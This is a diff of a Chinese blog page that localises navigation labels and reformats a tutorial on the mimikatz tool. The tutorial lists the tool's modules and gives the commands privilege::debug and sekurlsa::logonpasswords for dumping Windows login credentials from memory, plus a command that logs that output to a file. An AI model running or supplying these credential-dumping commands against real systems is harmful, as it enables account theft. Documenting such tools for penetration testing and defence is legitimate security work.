@@ -56,25 +56,25 @@
             <li>
                 <a href="/">
                     <i class="iconfont icon-shouye1"></i>
-                    <span>HOME</span>
+                    <span>主页</span>
                 </a>
             </li>
             <li>
                 <a href="/tags">
                     <i class="iconfont icon-biaoqian1"></i>
-                    <span>TAGS</span>
+                    <span>标签</span>
                 </a>
             </li>
             <li>
                 <a href="/archives">
                     <i class="iconfont icon-guidang2"></i>
-                    <span>ARCHIVES</span>
+                    <span>存档</span>
                 </a>
             </li>
             <li>
                 <a href="/about/">
                     <i class="iconfont icon-guanyu2"></i>
-                    <span>ABOUT</span>
+                    <span>关于</span>
                 </a>
             </li>
             
@@ -93,7 +93,7 @@
         <div class="search-input">
             <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
             <input id="search-input">
-            <span id="begin-search">search</span>
+            <span id="begin-search">搜索</span>
         </div>
         <div class="search-result-container" id="search-result-container">
 
@@ -117,24 +117,25 @@
     </div>
 
     <div class="post-meta">
-        <span class="attr">Post：<span>2021-03-31 13:13:47</span></span>
+        <span class="attr">发布于：<span>2021-03-31 13:13:47</span></span>
         
-        <span class="attr">Tags：/
+        <span class="attr">标签：/
         
         <a class="tag" href="/tags/#安全工具" title="安全工具">安全工具</a>
         <span>/</span>
         
         
         </span>
-        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
 </span>
 
     </div>
     <div class="post-content ">
         <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>mimikatz是一款功能强大的轻量级调试神器，可以直接抓取windows密码，被称为Windows 密码抓取神器。但它的功能远不止这么简单，通过它你还可以提升进程权限注入进程读取进程内存等等。<br><a id="more"></a><br>最重要的是能从 lsass.exe进程中获取windows的账号及明文密码——这是以前的事了，微软知道后已经准备了补丁，lsass进程不再保存明文口令。Mimikatz 现在只能读到加密后的密码。</p>
 <h1 id="mimikatz常规操作使用命令"><a href="#mimikatz常规操作使用命令" class="headerlink" title="mimikatz常规操作使用命令"></a>mimikatz常规操作使用命令</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cls  #清屏</span><br><span class="line">exit  #退出mimikatz</span><br><span class="line">version  #查看当前mimikatz版本</span><br><span class="line">localtime</span><br><span class="line">hostname</span><br><span class="line">[命令]::  #查看命令的具体参数</span><br></pre></td></tr></table></figure>
-<h1 id="mimikatz全部命令"><a href="#mimikatz全部命令" class="headerlink" title="mimikatz全部命令"></a>mimikatz全部命令</h1><p><code>`</code><br>        standard  -  Standard module  [Basic commands (does not require module n<br>ame)]<br>          crypto  -  Crypto Module<br>        sekurlsa  -  SekurLSA module  [Some commands to enumerate credentials…<br>]<br>        kerberos  -  Kerberos package module  []<br>       privilege  -  Privilege module<br>         process  -  Process module<br>         service  -  Service module<br>         lsadump  -  LsaDump module<br>              ts  -  Terminal Server module<br>           event  -  Event module<br>            misc  -  Miscellaneous module<br>           token  -  Token manipulation module<br>           vault  -  Windows Vault/Credential module<br>     minesweeper  -  MineSweeper module<br>             net  -<br>           dpapi  -  DPAPI Module (by API or RAW access)  [Data Protection appli<br>cation programming interface]<br>       busylight  -  BusyLight Module<br>          sysenv  -  System Environment Value module<br>             sid  -  Security Identifiers module<br>             iis  -  IIS XML Config module<br>             rpc  -  RPC control of mimikatz<br>            sr98  -  RF module for SR98 device and T5577 target<br>             rdm  -  RF module for RDM(830 AL) device<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">系统方面的操作使用命令:sysenv</span><br><span class="line">系统服务相关的操作使用命令:service</span><br><span class="line">系统进程相关操作的使用命令:process</span><br><span class="line">加密相关操作使用命令:crypto</span><br><span class="line">在服务器终端的操作命令: ts  </span><br><span class="line">    eg: ts::sessions  #显示当前会话</span><br><span class="line"></span><br><span class="line">系统线程相关操作使用命令:thread （未找到）</span><br><span class="line">系统句柄相关操作使用命令:handle （未找到）</span><br><span class="line">注入操作使用命令:inject （未找到）</span><br></pre></td></tr></table></figure></p>
-<h1 id="mimikatz命令的写法"><a href="#mimikatz命令的写法" class="headerlink" title="mimikatz命令的写法"></a>mimikatz命令的写法</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">一种是进入mimikatz直接执行命令，如：</span><br><span class="line">mimikatz# privilege::debug</span><br><span class="line">mimikatz# sekurlsa::logonpasswords</span><br><span class="line">另一种是在cmd下调用mimikatz一次性执行多条命令，如：</span><br><span class="line">C:&gt; mimikatz.exe &quot;privilege::debug&quot; &quot;&quot;sekurlsa::logonpasswords&quot;&quot; exit</span><br></pre></td></tr></table></figure>
+<h1 id="mimikatz全部命令"><a href="#mimikatz全部命令" class="headerlink" title="mimikatz全部命令"></a>mimikatz全部命令</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">        standard  -  Standard module  [Basic commands (does not require module name)]          crypto  -  Crypto Module        sekurlsa  -  SekurLSA module  [Some commands to enumerate credentials...]        kerberos  -  Kerberos package module  []       privilege  -  Privilege module         process  -  Process module         service  -  Service module         lsadump  -  LsaDump module              ts  -  Terminal Server module           event  -  Event module            misc  -  Miscellaneous module           token  -  Token manipulation module           vault  -  Windows Vault/Credential module     minesweeper  -  MineSweeper module             net  -           dpapi  -  DPAPI Module (by API or RAW access)  [Data Protection application programming interface]       busylight  -  BusyLight Module          sysenv  -  System Environment Value module             sid  -  Security Identifiers module             iis  -  IIS XML Config module             rpc  -  RPC control of mimikatz            sr98  -  RF module for SR98 device and T5577 target             rdm  -  RF module for RDM(830 AL) device</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">系统方面的操作使用命令:sysenv</span><br><span class="line">系统服务相关的操作使用命令:service</span><br><span class="line">系统进程相关操作的使用命令:process</span><br><span class="line">加密相关操作使用命令:crypto</span><br><span class="line">在服务器终端的操作命令: ts  </span><br><span class="line">    eg: ts::sessions  #显示当前会话</span><br><span class="line"></span><br><span class="line">系统线程相关操作使用命令:thread （未找到）</span><br><span class="line">系统句柄相关操作使用命令:handle （未找到）</span><br><span class="line">注入操作使用命令:inject （未找到）</span><br></pre></td></tr></table></figure>
+<h1 id="mimikatz命令的写法"><a href="#mimikatz命令的写法" class="headerlink" title="mimikatz命令的写法"></a>mimikatz命令的写法</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">一种是进入mimikatz直接执行命令，如：</span><br><span class="line">mimikatz# privilege::debug</span><br><span class="line">mimikatz# sekurlsa::logonpasswords</span><br><span class="line"></span><br><span class="line">另一种是在cmd下调用mimikatz一次性执行多条命令，如：</span><br><span class="line">C:&gt; mimikatz.exe &quot;privilege::debug&quot; &quot;&quot;sekurlsa::logonpasswords&quot;&quot; exit</span><br></pre></td></tr></table></figure>
 <h1 id="mimikatz的使用"><a href="#mimikatz的使用" class="headerlink" title="mimikatz的使用"></a>mimikatz的使用</h1><h3 id="获得本机登陆账户的密码"><a href="#获得本机登陆账户的密码" class="headerlink" title="获得本机登陆账户的密码"></a>获得本机登陆账户的密码</h3><p>依次执行以下两条命令，可获得本机登陆账户的用户名密码等信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. privilege::debug</span><br><span class="line">2. sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure></p>
 <p><a href="https://imgtu.com/i/ckCVUg" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/03/31/ckCVUg.jpg" alt="ckCVUg.jpg"></a></p>
 <h3 id="记录-Mimikatz输出"><a href="#记录-Mimikatz输出" class="headerlink" title="记录 Mimikatz输出"></a>记录 Mimikatz输出</h3><p>把执行mimikatz命令得到的结果记录到txt文件中，可以使用以下命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:&gt;mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;log sekurlsa::logonpasswords full&quot;&quot; exit</span><br></pre></td></tr></table></figure></p>
